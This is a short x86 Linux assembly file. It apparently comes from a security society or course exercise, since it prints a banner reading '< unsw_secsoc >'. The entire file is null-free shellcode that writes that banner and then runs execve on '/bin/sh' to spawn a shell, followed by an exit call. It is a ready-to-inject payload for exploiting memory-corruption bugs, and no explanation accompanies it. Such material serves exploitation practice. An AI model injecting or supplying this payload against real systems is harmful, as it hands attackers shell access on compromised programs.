;Equals - VV

global _start

section .text
_start:
   xor eax, eax

   push eax
   push eax
   pop ebx
   push 0x0a3e2063
   push 0x6f736365
   push 0x735f7773
   push 0x6e75203c

   mov dl, 0x10
   push esp
   pop ecx
   inc ebx
   mov al, 0x4

   int 0x80

   xor eax, eax
   push eax
   push 0x68732f6e
   push 0x69622f2f
   push esp
   pop ebx
   push eax
   mov edx, esp
   push esp
   pop ecx

   mov al, 11
   int 0x80

   xor eax, eax
   push eax
   pop ebx
   inc eax
   int 0x80
